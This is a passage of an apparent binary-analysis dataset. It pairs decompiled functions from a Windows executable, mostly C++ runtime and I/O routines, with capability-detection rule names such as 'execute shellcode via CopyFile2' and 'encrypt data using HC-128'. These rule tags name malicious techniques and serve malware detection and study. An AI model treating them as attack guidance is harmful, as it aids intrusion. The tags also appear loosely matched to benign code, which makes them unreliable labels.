pcVar6 + 1;\ncode_r0x0001400189c1:\n    if (0 < iVar2) {\n        iVar2 = iVar2 - (pcVar5 - pcVar1);\n        *(arg4 + 0xc) = iVar2;\n        if (0 < iVar2) {\n            if ((uVar9 & 0x1c0) != 0) {\n                *(arg4 + 0xc) = iVar2 + -1;\n            }\n            if ((iVar8 < 0) && ((uVar9 & 0x600) == 0x200)) {\n                iVar8 = *(arg4 + 0xc);\n                *(arg4 + 0xc) = iVar8 + -1;\n                if (0 < iVar8) {\n                    *(&stack0xffffffffffffff90 + iVar3) = 0x140018ba9;\n                    sub.msvcrt.dll_memset(pcVar5, 0x30, iVar8);\n                    *(arg4 + 0xc) = 0xffffffff;\n                    pcVar5 = pcVar5 + iVar8;\n                }\n            }\n            else if (((uVar9 & 0x400) == 0) && (iVar8 = *(arg4 + 0xc),  *(arg4 + 0xc) = iVar8 + -1,  0 < iVar8)) {\n                do {\n                    *(&stack0xffffffffffffff90 + iVar3) = 0x140018bdd;\n                    fcn.140017f90(0x20, arg4);\n                    iVar8 = *(arg4 + 0xc);\n                    *(arg4 + 0xc) = iVar8 + -1;\n                } while (0 < iVar8);\n                uVar9 = *(arg4 + 1);\n            }\n        }\n    }\n    if ((uVar9 & 0x80) == 0) {\n        if ((uVar9 & 0x100) == 0) {\n            if ((uVar9 & 0x40) != 0) {\n                *pcVar5 = ' ';\n                pcVar5 = pcVar5 + 1;\n            }\n        }\n        else {\n            *pcVar5 = '+';\n            pcVar5 = pcVar5 + 1;\n        }\n    }\n    else {\n        *pcVar5 = '-';\n        pcVar5 = pcVar5 + 1;\n    }\n    if (pcVar1 < pcVar5) {\n        do {\n            pcVar5 = pcVar5 + -1;\n            if (((uVar9 & 0x4000) == 0) && (iVar8 = *(arg4 + 0x24),  *(arg4 + 5) == iVar8 || *(arg4 + 5) < iVar8)) {\ncode_r0x000140018a2a:\n                *(arg4 + 0x24) = iVar8 + 1;\n            }\n            else {\n                if ((uVar9 & 0x2000) == 0) {\n                    *(*arg4 + *(arg4 + 0x24)) = *pcVar5;\n                    iVar8 = *(arg4 + 0x24);\n                    goto code_r0x000140018a2a;\n                }\n                *(&stack0xffffffffffffff90 + iVar3) = 0x140018a62;\n                sub.msvcrt.dll_fputc();\n                *(arg4 + 0x24) = *(arg4 + 0x24) + 1;\n            }\n            if (pcVar1 == pcVar5) break;\n            uVar9 = *(arg4 + 1);\n        } while( true );\n    }\n    iVar8 = *(arg4 + 0xc);\n    while( true ) {\n        *(arg4 + 0xc) = iVar8 + -1;\n        if (iVar8 < 1) break;\n        if (((*(arg4 + 1) & 0x4000) != 0) ||\n           (iVar2 = *(arg4 + 0x24),  iVar8 = iVar8 + -1,  *(arg4 + 5) != iVar2 && iVar2 <= *(arg4 + 5))) {\n            if ((*(arg4 + 1) & 0x2000) == 0) {\n                *(*arg4 + *(arg4 + 0x24)) = 0x20;\n                iVar2 = *(arg4 + 0x24);\n                iVar8 = *(arg4 + 0xc);\n            }\n            else {\n                *(&stack0xffffffffffffff90 + iVar3) = 0x140018aba;\n                sub.msvcrt.dll_fputc();\n                iVar2 = *(arg4 + 0x24);\n                iVar8 = *(arg4 + 0xc);\n            }\n        }\n        *(arg4 + 0x24) = iVar2 + 1;\n    }\n    return;\n}\n",
        "token_count": 2155
    },
    "140029dd": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint64_t fcn.140029dd0(int64_t **arg1, int64_t **arg2)\n\n{\n    int64_t *piVar1;\n    bool bVar2;\n    int32_t iVar3;\n    uint64_t in_RAX;\n    uint64_t uVar4;\n    bool bVar5;\n    \n    piVar1 = *arg1;\n    uVar4 = in_RAX & 0xffffffffffffff00;\n    bVar2 = piVar1 != NULL && *(arg1 + 1) == -1;\n    bVar5 = *(arg1 + 1) == -1;\n    if (bVar2) {\n        uVar4 = piVar1[3];\n        if (uVar4 <= piVar1[2]) {\n            uVar4 = (**(*piVar1 + 0x48))();\n            if (uVar4 == -1) {\n                *arg1 = NULL;\n                bVar5 = bVar2;\n                goto code_r0x000140029df6;\n            }\n        }\n        bVar5 = false;\n    }\ncode_r0x000140029df6:\n    piVar1 = *arg2;\n    bVar2 = *(arg2 + 1) == -1;\n    uVar4 = uVar4 & 0xffffffffffffff00;\n    if (piVar1 == NULL || !bVar2) {\ncode_r0x000140029e0a:\n        return uVar4 | bVar5 == bVar2;\n    }\n    if (piVar1[3] <= piVar1[2]) {\n        iVar3 = (**(*piVar1 + 0x48))();\n        uVar4 = 0;\n        if (iVar3 == -1) {\n            *arg2 = NULL;\n            bVar2 = piVar1 != NULL && bVar2;\n            goto code_r0x000140029e0a;\n        }\n    }\n    return bVar5 == false;\n}\n",
        "token_count": 426
    },
    "140029e9": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint64_t fcn.140029e90(int64_t **arg1)\n\n{\n    int64_t *piVar1;\n    uint64_t uVar2;\n    \n    uVar2 = *(arg1 + 1);\n    piVar1 = *arg1;\n    if ((*(arg1 + 1) == 0xffffffff) && (piVar1 != NULL)) {\n        if (piVar1[2] < piVar1[3]) {\n            return *piVar1[2];\n        }\n        uVar2 = (**(*piVar1 + 0x48))();\n        if (uVar2 == -1) {\n            *arg1 = NULL;\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 156
    },
    "14007833": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nchar * fcn.140078330(uchar *arg1, char **arg2, ulong arg3)\n\n{\n    uint8_t uVar1;\n    int64_t *piVar2;\n    char cVar3;\n    int32_t iVar4;\n    uint8_t *puVar5;\n    char **arg1_00;\n    int64_t iVar6;\n    char *pcVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    char *pcVar10;\n    uint8_t *puVar11;\n    uint64_t arg2_00;\n    int64_t iVar12;\n    uchar auStack88 [8];\n    ulong uStack80;\n    \n    pcVar7 = *arg2;\n    *arg1 = 0;\n    cVar3 = arg3;\n    iVar6 = *(pcVar7 + -0x18) + arg2;\n    uVar9 = *(iVar6 + 0x20);\n    pcVar10 = uVar9;\n    if (uVar9 != 0) goto code_r0x000140078385;\n    pcVar7 = *(iVar6 + 0xd8);\n    if (pcVar7 == NULL) {\n        if ((cVar3 != '\\0') || ((*(iVar6 + 0x19) & 0x10) == 0)) goto code_r0x0001400783a3;\ncode_r0x0001400783b0:\n        piVar2 = *(iVar6 + 0xe8);\n        if (piVar2[2] < piVar2[3]) {\n            iVar12 = *(iVar6 + 0xf0);\n            pcVar7 = *piVar2[2];\n            if (iVar12 == 0) {\ncode_r0x00014007848d:\n                uStack80 = 0x140078492;\n                arg1_00 = fcn.1400bd1f0();\n                if (pcVar10 == 0x1) {\n                    uStack80 = 0x1400784a0;\n                    fcn.1400bc860(arg1_00);\n                    arg2 = arg2 + *(*arg2 + -0x18);\n                    uStack80 = 0x1400784b4;\n                    arg1_00 = arg2;\n                    fcn.1400b4780(arg2, 1);\n                    uStack80 = 0x1400784b9;\n                    fcn.1400bcd60();\n                }\n                uStack80 = 0x1400784be;\n                fcn.1400bc860(arg1_00);\n                uStack80 = 0x1400784d2;\n                fcn.1400b4780(*(*arg2 + -0x18) + arg2, 1);\n                uStack80 = 0x1400784d7;\n                fcn.1400bca40();\ncode_r0x00014007840f:\n                pcVar7 = *arg2;\n                iVar6 = arg2 + *(pcVar7 + -0x18);\n                goto code_r0x00014007837e;\n            }\ncode_r0x0001400783d8:\n            do {\n                uVar1 = *(*(iVar12 + 0x30) + (pcVar7 & 0xff) * 2);\n                while( true ) {\n                    if ((uVar1 & 0x20) == 0) goto code_r0x00014007840f;\n                    puVar11 = piVar2[3];\n                    if (piVar2[2] < puVar11) {\n                        puVar5 = piVar2[2] + 1;\n                        piVar2[2] = puVar5;\n                    }\n                    else {\n                        uStack80 = 0x140078429;\n                        iVar4 = (**(*piVar2 + 0x50))(piVar2);\n                        if (iVar4 == -1) goto code_r0x00014007844e;\n                        puVar5 = piVar2[2];\n                        puVar11 = piVar2[3];\n                    }\n                    if (puVar11 <= puVar5) break;\n                    uVar1 = *(*(iVar12 + 0x30) + *puVar5 * 2);\n                }\n                uStack80 = 0x140078449;\n                pcVar7 = (**(*piVar2 + 0x48))(piVar2);\n            } while (pcVar7 != -1);\ncode_r0x00014007844e:\n            pcVar7 = *arg2;\n            iVar6 = arg2 + *(pcVar7 + -0x18);\n        }\n        else {\n            uStack80 = 0x14007846c;\n            pcVar7 = (**(*piVar2 + 0x48))(piVar2);\n            pcVar10 = *arg2;\n            iVar6 = *(pcVar10 + -0x18) + arg2;\n            iVar12 = *(iVar6 + 0xf0);\n            if (iVar12 == 0) goto code_r0x00014007848d;\n            if (pcVar7 != -1) goto code_r0x0001400783d8;\n        }\n        uVar9 = *(iVar6 + 0x20) | 2;\n    }\n    else {\n        uStack80 = 0x140078369;\n        fcn.140079860(pcVar7);\n        pcVar7 = *arg2;\n        iVar6 = *(pcVar7 + -0x18) + arg2;\n        if ((cVar3 == '\\0') && ((*(iVar6 + 0x19) & 0x10) != 0)) goto code_r0x0001400783b0;\ncode_r0x00014007837e:\n        uVar9 = *(iVar6 + 0x20);\n        if (uVar9 == 0) {\ncode_r0x0001400783a3:\n            *arg1 = 1;\n            return pcVar7;\n        }\n    }\ncode_r0x000140078385:\n    uVar8 = uVar9 | 4;\n    if (*(iVar6 + 0xe8) == 0) {\n        uVar8 = uVar9 | 5;\n    }\n    *(iVar6 + 0x20) = uVar8;\n    uVar8 = uVar8 & *(iVar6 + 0x1c);\n    arg2_00 = uVar8;\n    if (uVar8 == 0) {\n        return pcVar7;\n    }\n    pcVar7 = \"basic_ios::clear\";\n    fcn.1400bd8d0(\"basic_ios::clear\");\n    fcn.1400a59d0(pcVar7, arg2_00 + 0xd0);\n    fcn.1400b3230(&stack0xffffffffffffffa8, arg2_00, arg3);\n    fcn.1400a5ae0(&stack0xffffffffffffffa8);\n    fcn.1400b47a0(arg2_00, arg3);\n    piVar2 = *(arg2_00 + 0xe8);\n    if (piVar2 != NULL) {\n        fcn.1400a59d0(&stack0xffffffffffffffa8, piVar2 + 7);\n        (**(*piVar2 + 0x10))(piVar2, arg3);\n        fcn.1400a5b40(piVar2 + 7, arg3);\n        fcn.1400a5ae0(&stack0xffffffffffffffa8);\n    }\n    return pcVar7;\n}\n",
        "token_count": 1648
    },
    "140079ea": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.140079ea0(int64_t arg1)\n\n{\n    int64_t *piVar1;\n    char cVar2;\n    int32_t iVar3;\n    int64_t iVar4;\n    \n    piVar1 = *(arg1 + 8);\n    iVar4 = *(*piVar1 + -0x18);\n    if ((*(piVar1 + iVar4 + 0x19) & 0x20) != 0) {\n        cVar2 = fcn.1400b76c0();\n        if ((cVar2 == '\\0') && (piVar1 = *(piVar1 + iVar4 + 0xe8),  piVar1 != NULL)) {\n            iVar3 = (**(*piVar1 + 0x30))();\n            if (iVar3 == -1) {\n                iVar4 = *(arg1 + 8) + *(**(arg1 + 8) + -0x18);\n                fcn.1400b4ab0(iVar4, *(iVar4 + 0x20) | 1);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 240
    },
    "14008206": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint64_t fcn.140082060(ulong *arg1, ulong arg2, ulong arg3)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    \n    pcVar1 = _sym.imp.msvcrt.dll__errno;\n    do {\n        uVar2 = sub.msvcrt.dll__fileno_1(*arg1);\n        iVar3 = sub.msvcrt.dll__read(uVar2, arg2, arg3);\n        if (iVar3 != -1) {\n            return iVar3;\n        }\n        piVar4 = (*pcVar1)();\n    } while (*piVar4 == 4);\n    return iVar3;\n}\n",
        "token_count": 157
    },
    "1400820e": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint64_t fcn.1400820e0(ulong arg1, int64_t arg2, uint64_t arg3)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    uint64_t uVar5;\n    \n    uVar2 = fcn.140081eb0(arg1);\n    pcVar1 = _sym.imp.msvcrt.dll__errno;\n    uVar5 = arg3;\n    while( true ) {\n        while( true ) {\n            iVar3 = sub.msvcrt.dll__write(uVar2, arg2, uVar5 & 0xffffffff);\n            if (iVar3 != -1) break;\n            piVar4 = (*pcVar1)();\n            if (*piVar4 != 4) {\n                return arg3 - uVar5;\n            }\n        }\n        uVar5 = uVar5 - iVar3;\n        if (uVar5 == 0) break;\n        arg2 = arg2 + iVar3;\n    }\n    return arg3;\n}\n",
        "token_count": 231
    },
    "14008228": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint64_t fcn.140082280(ulong arg1, int64_t arg2, uint64_t arg3, int64_t arg4)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    uint64_t uVar5;\n    uint64_t in_stack_00000028;\n    \n    uVar2 = fcn.140081eb0(arg1);\n    pcVar1 = _sym.imp.msvcrt.dll__errno;\n    uVar5 = arg3;\n    if (arg3 == 0) {\ncode_r0x000140082300:\n        uVar2 = fcn.140081eb0(arg1);\n        pcVar1 = _sym.imp.msvcrt.dll__errno;\n        uVar5 = in_stack_00000028;\n        do {\n            while( true ) {\n                iVar3 = sub.msvcrt.dll__write(uVar2, arg4, uVar5 & 0xffffffff);\n                if (iVar3 == -1) break;\n                uVar5 = uVar5 - iVar3;\n                if (uVar5 == 0) goto code_r0x0001400822ed;\n                arg4 = arg4 + iVar3;\n            }\n            piVar4 = (*pcVar1)();\n        } while (*piVar4 == 4);\n        in_stack_00000028 = in_stack_00000028 - uVar5;\n    }\n    else {\n        do {\n            while( true ) {\n                iVar3 = sub.msvcrt.dll__write(uVar2, arg2, uVar5 & 0xffffffff);\n                if (iVar3 == -1) break;\n                uVar5 = uVar5 - iVar3;\n                if (uVar5 == 0) goto code_r0x000140082300;\n                arg2 = arg2 + iVar3;\n            }\n            piVar4 = (*pcVar1)();\n        } while (*piVar4 == 4);\n        in_stack_00000028 = -uVar5;\n    }\ncode_r0x0001400822ed:\n    return arg3 + in_stack_00000028;\n}\n",
        "token_count": 467
    },
    "1400a280": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.1400a2800(int64_t arg1)\n\n{\n    uchar uVar1;\n    ushort uVar2;\n    int32_t iVar3;\n    uint64_t uVar4;\n    int64_t iVar5;\n    \n    iVar5 = 0;\n    do {\n        iVar3 = fcn.140015880();\n        if (iVar3 == -1) {\n            uVar1 = 0;\n            goto code_r0x0001400a282f;\n        }\n        *(arg1 + 0x19 + iVar5) = iVar3;\n        iVar5 = iVar5 + 1;\n    } while (iVar5 != 0x80);\n    uVar1 = 1;\ncode_r0x0001400a282f:\n    *(arg1 + 0x18) = uVar1;\n    uVar4 = 0;\n    do {\n        uVar2 = fcn.140015810(uVar4 & 0xffffffff);\n        *(arg1 + 0x9a + uVar4 * 2) = uVar2;\n        uVar4 = uVar4 + 1;\n    } while (uVar4 != 0x100);\n    iVar5 = 0;\n    do {\n        *(arg1 + 0x29a + iVar5 * 2) = 1 << (iVar5 & 0x1f);\n        uVar2 = fcn.14002bd40();\n        *(arg1 + 0x2ba + iVar5 * 2) = uVar2;\n        iVar5 = iVar5 + 1;\n    } while (iVar5 != 0x10);\n    return;\n}\n",
        "token_count": 359
    },
    "1400942a": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.1400942a0(int64_t arg1)\n\n{\n    int64_t *piVar1;\n    char cVar2;\n    int32_t iVar3;\n    int64_t iVar4;\n    \n    piVar1 = *(arg1 + 8);\n    iVar4 = *(*piVar1 + -0x18);\n    if ((*(piVar1 + iVar4 + 0x19) & 0x20) != 0) {\n        cVar2 = fcn.1400b76c0();\n        if ((cVar2 == '\\0') && (piVar1 = *(piVar1 + iVar4 + 0xe8),  piVar1 != NULL)) {\n            iVar3 = (**(*piVar1 + 0x30))();\n            if (iVar3 == -1) {\n                iVar4 = *(arg1 + 8) + *(**(arg1 + 8) + -0x18);\n                fcn.1400b5480(iVar4, *(iVar4 + 0x20) | 1);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 240
    },
    "14009b7a": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint64_t fcn.14009b7a0(int64_t *arg1, uchar *arg2, int64_t arg3)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    int64_t iVar6;\n    int64_t iVar7;\n    \n    iVar6 = 0;\n    if (arg3 < 1) {\n        return 0;\n    }\n    do {\n        iVar4 = arg1[2];\n        iVar5 = arg1[3] - iVar4;\n        if (iVar5 != 0) {\n            iVar7 = arg3 - iVar6;\n            if (iVar7 < iVar5) {\n                sub.msvcrt.dll_memcpy(arg2, iVar4, iVar7);\n                arg1[2] = arg1[2] + iVar7;\n                return arg3;\n            }\n            iVar6 = iVar6 + iVar5;\n            iVar4 = sub.msvcrt.dll_memcpy(arg2, iVar4, iVar5);\n            arg1[2] = arg1[2] + iVar5;\n            if (arg3 <= iVar6) {\n                return iVar6;\n            }\n            arg2 = iVar5 + iVar4;\n        }\n        pcVar1 = *(*arg1 + 0x50);\n        if (pcVar1 == 0x14009b560) {\n            pcVar1 = *(*arg1 + 0x48);\n            if (pcVar1 == 0x14009bb50) {\n                return iVar6;\n            }\n            iVar2 = (*pcVar1)(arg1);\n            if (iVar2 == -1) {\n                return iVar6;\n            }\n            uVar3 = *arg1[2];\n            arg1[2] = arg1[2] + 1;\n        }\n        else {\n            uVar3 = (*pcVar1)(arg1);\n            if (uVar3 == 0xffffffff) {\n                return iVar6;\n            }\n        }\n        iVar6 = iVar6 + 1;\n        *arg2 = uVar3;\n        arg2 = arg2 + 1;\n        if (arg3 <= iVar6) {\n            return iVar6;\n        }\n    } while( true );\n}\n",
        "token_count": 490
    },
    "1400a25f": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\nvoid fcn.1400a25f0(int64_t *arg1, int64_t arg2, ulong arg3, int64_t arg4)\n\n{\n    int64_t iVar1;\n    uint64_t uVar2;\n    ulong *puVar3;\n    \n    *(arg1 + 4) = 0x0;\n    *(arg1 + 0x39) = 0;\n    *(arg1 + 1) = arg4 != 0;\n    iVar1 = *0x140110670;\n    *(arg1 + 0x131) = 0;\n    *arg1 = iVar1 + 0x10;\n    *(arg1 + 3) = arg2 != 0 & arg3;\n    if (arg2 == 0) {\n        arg2 = 0x140119960;\n    }\n    puVar3 = arg1 + 0x41U & 0xfffffffffffffff8;\n    arg1[6] = arg2;\n    uVar2 = (arg1 - puVar3) + 0x139U >> 3;\n    for (; uVar2 != 0; uVar2 = uVar2 - 1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *(arg1 + 7) = 0;\n    *(arg1 + 0x139) = 0;\n    puVar3 = arg1 + 0x141U & 0xfffffffffffffff8;\n    *(arg1 + 0x231) = 0;\n    uVar2 = (arg1 - puVar3) + 0x239U >> 3;\n    for (; uVar2 != 0; uVar2 = uVar2 - 1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *(arg1 + 0x239) = 0;\n    return;\n}\n",
        "token_count": 424
    },
    "1400bc71": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\nulong * fcn.1400bc710(int64_t arg1)\n\n{\n    int64_t *piVar1;\n    int32_t iVar2;\n    ulong arg2;\n    ulong uVar3;\n    char cVar4;\n    ulong *puVar5;\n    code *pcVar6;\n    int64_t *piVar7;\n    int64_t **ppiVar8;\n    ulong arg1_00;\n    uint64_t uVar9;\n    int64_t iVar10;\n    ulong *puVar11;\n    uchar auStack288 [16];\n    ulong uStack272;\n    int64_t *piStack240;\n    \n    iVar10 = 1;\n    if (arg1 != 0) {\n        iVar10 = arg1;\n    }\n    while( true ) {\n        puVar5 = sub.msvcrt.dll_malloc(iVar10);\n        if (puVar5 != NULL) {\n            return puVar5;\n        }\n        pcVar6 = fcn.1400b66b0();\n        if (pcVar6 == NULL) break;\n        (*pcVar6)();\n    }\n    piVar7 = fcn.1400bc7f0(8);\n    *piVar7 = *0x140110790 + 0x10;\n    fcn.1400bcdb0(piVar7, 0x1401135d0, fcn.1400b4730);\n    puVar5 = sub.msvcrt.dll_malloc(0x90);\n    if (puVar5 == NULL) {\n        iVar10 = 0x90;\n        puVar5 = fcn.140020150(0x90);\n        if (puVar5 == NULL) {\n            fcn.1400b8f90();\n            piVar7 = iVar10 + 0xa0;\n            puVar5 = sub.msvcrt.dll_malloc();\n            if ((puVar5 != NULL) || (puVar5 = fcn.140020150(piVar7),  puVar5 != NULL)) {\n                *puVar5 = 0;\n                puVar5[0x13] = 0;\n                puVar11 = puVar5 + 1 & 0xfffffffffffffff8;\n                for (uVar9 = (puVar5 - (puVar5 + 1 & 0xfffffffffffffff8)) + 0xa0U >> 3; uVar9 != 0; uVar9 = uVar9 - 1) {\n                    *puVar11 = 0;\n                    puVar11 = puVar11 + 1;\n                }\n                return puVar5 + 0x14;\n            }\n            fcn.1400b8f90();\n            ppiVar8 = fcn.1400bcb60();\n            piVar1 = piVar7 + -10;\n            piStack240 = *ppiVar8;\n            if (*piVar7 + 0xb8b1aabcbcd4d500U < 2) {\n                iVar2 = *(piVar7 + -5);\n                if (iVar2 < 0) {\n                    iVar2 = -iVar2;\n                }\n                *(piVar7 + -5) = iVar2 + 1;\n                *(ppiVar8 + 1) = *(ppiVar8 + 1) + -1;\n                if (piStack240 != piVar1) {\n                    piVar7[-6] = piStack240;\n                    *ppiVar8 = piVar1;\n                }\n                return piVar7[-1];\n            }\n            if (piStack240 == NULL) {\n                *ppiVar8 = piVar1;\n                return NULL;\n            }\n            fcn.1400b8f90();\n            if ((piStack240 == NULL) || (fcn.1400bc860(piStack240),  1 < *piStack240 + 0xb8b1aabcbcd4d500U)) {\n                fcn.1400b8f90();\n            }\n            iVar10 = piStack240[-7];\n            fcn.14001f750();\n            fcn.1400bc860(iVar10);\n            uStack272 = *(iVar10 + -0x10);\n            arg2 = *(iVar10 + -0x18);\n            iVar2 = *(iVar10 + -0x24);\n            uVar3 = *(iVar10 + -0x38);\n            arg1_00 = fcn.14001f770(*(iVar10 + -0x40));\n            fcn.1400bc860(arg1_00);\n            piVar7 = fcn.1400bcb70();\n            puVar5 = *piVar7;\n            if ((*(puVar5 + 10) & 1) == 0) goto code_r0x0001400bc9da;\n            puVar5 = *puVar5;\n            while( true ) {\n                fcn.14001f340(0, arg2, auStack288);\n                cVar4 = fcn.14001f430(auStack288, puVar5[-0x12], puVar5, iVar2);\n                if (cVar4 != '\\0') break;\n                puVar5 = 0x140112960;\n                cVar4 = fcn.14001f430(auStack288, 0x140112960, 0, iVar2);\n                if (cVar4 == '\\0') goto code_r0x0001400bc9fd;\n                piVar7 = fcn.1400bc7f0(8);\n                *piVar7 = *0x1401104c0 + 0x10;\n                fcn.1400bcdb0(piVar7, 0x140112960, 0x1400892d0);\ncode_r0x0001400bc9da:\n                puVar5 = puVar5 + 0x12;\n            }\n            fcn.1400bcd60();\ncode_r0x0001400bc9fd:\n            fcn.14001f750(uVar3);\n            ppiVar8 = fcn.1400bcb60();\n            piVar7 = *ppiVar8;\n            if (piVar7 != NULL) {\n                if ((*(piVar7 + 10) & 1) != 0) {\n                    piVar7 = *piVar7 + -0x90;\n                }\n                piVar7 = *piVar7;\n            }\n            return piVar7;\n        }\n    }\n    *puVar5 = 0;\n    puVar5[0x11] = 0;\n    puVar11 = puVar5 + 1 & 0xfffffffffffffff8;\n    for (uVar9 = (puVar5 - (puVar5 + 1 & 0xfffffffffffffff8)) + 0x90U >> 3; uVar9 != 0; uVar9 = uVar9 - 1) {\n        *puVar11 = 0;\n        puVar11 = puVar11 + 1;\n    }\n    return puVar5;\n}\n",
        "token_count": 1506
    },
    "1400bc7f": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\nulong * fcn.1400bc7f0(int64_t size)\n\n{\n    int64_t *piVar1;\n    int32_t iVar2;\n    ulong arg2;\n    ulong uVar3;\n    char cVar4;\n    ulong *puVar5;\n    int64_t **ppiVar6;\n    ulong arg1;\n    int64_t *piVar7;\n    uint64_t uVar8;\n    int64_t arg1_00;\n    ulong *puVar9;\n    uchar auStack208 [16];\n    ulong uStack192;\n    int64_t *piStack160;\n    \n    piVar7 = size + 0xa0;\n    puVar5 = sub.msvcrt.dll_malloc();\n    if (puVar5 != NULL) {\ncode_r0x0001400bc809:\n        *puVar5 = 0;\n        puVar5[0x13] = 0;\n        puVar9 = puVar5 + 1 & 0xfffffffffffffff8;\n        for (uVar8 = (puVar5 - (puVar5 + 1 & 0xfffffffffffffff8)) + 0xa0U >> 3; uVar8 != 0; uVar8 = uVar8 - 1) {\n            *puVar9 = 0;\n            puVar9 = puVar9 + 1;\n        }\n        return puVar5 + 0x14;\n    }\n    puVar5 = fcn.140020150(piVar7);\n    if (puVar5 != NULL) goto code_r0x0001400bc809;\n    fcn.1400b8f90();\n    ppiVar6 = fcn.1400bcb60();\n    piVar1 = piVar7 + -10;\n    piStack160 = *ppiVar6;\n    if (*piVar7 + 0xb8b1aabcbcd4d500U < 2) {\n        iVar2 = *(piVar7 + -5);\n        if (iVar2 < 0) {\n            iVar2 = -iVar2;\n        }\n        *(piVar7 + -5) = iVar2 + 1;\n        *(ppiVar6 + 1) = *(ppiVar6 + 1) + -1;\n        if (piStack160 != piVar1) {\n            piVar7[-6] = piStack160;\n            *ppiVar6 = piVar1;\n        }\n        return piVar7[-1];\n    }\n    if (piStack160 == NULL) {\n        *ppiVar6 = piVar1;\n        return NULL;\n    }\n    fcn.1400b8f90();\n    if (piStack160 != NULL) {\n        fcn.1400bc860(piStack160);\n        if (*piStack160 + 0xb8b1aabcbcd4d500U < 2) goto code_r0x0001400bc90a;\n    }\n    fcn.1400b8f90();\ncode_r0x0001400bc90a:\n    arg1_00 = piStack160[-7];\n    fcn.14001f750();\n    fcn.1400bc860(arg1_00);\n    uStack192 = *(arg1_00 + -0x10);\n    arg2 = *(arg1_00 + -0x18);\n    iVar2 = *(arg1_00 + -0x24);\n    uVar3 = *(arg1_00 + -0x38);\n    arg1 = fcn.14001f770(*(arg1_00 + -0x40));\n    fcn.1400bc860(arg1);\n    piVar7 = fcn.1400bcb70();\n    puVar5 = *piVar7;\n    if ((*(puVar5 + 10) & 1) == 0) goto code_r0x0001400bc9da;\n    puVar5 = *puVar5;\n    while( true ) {\n        fcn.14001f340(0, arg2, auStack208);\n        cVar4 = fcn.14001f430(auStack208, puVar5[-0x12], puVar5, iVar2);\n        if (cVar4 != '\\0') break;\n        puVar5 = 0x140112960;\n        cVar4 = fcn.14001f430(auStack208, 0x140112960, 0, iVar2);\n        if (cVar4 == '\\0') goto code_r0x0001400bc9fd;\n        piVar7 = fcn.1400bc7f0(8);\n        *piVar7 = *0x1401104c0 + 0x10;\n        fcn.1400bcdb0(piVar7, 0x140112960, 0x1400892d0);\ncode_r0x0001400bc9da:\n        puVar5 = puVar5 + 0x12;\n    }\n    fcn.1400bcd60();\ncode_r0x0001400bc9fd:\n    fcn.14001f750(uVar3);\n    ppiVar6 = fcn.1400bcb60();\n    piVar7 = *ppiVar6;\n    if (piVar7 != NULL) {\n        if ((*(piVar7 + 10) & 1) != 0) {\n            piVar7 = *piVar7 + -0x90;\n        }\n        piVar7 = *piVar7;\n    }\n    return piVar7;\n}\n",
        "token_count": 1189
    },
    "140014b8": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
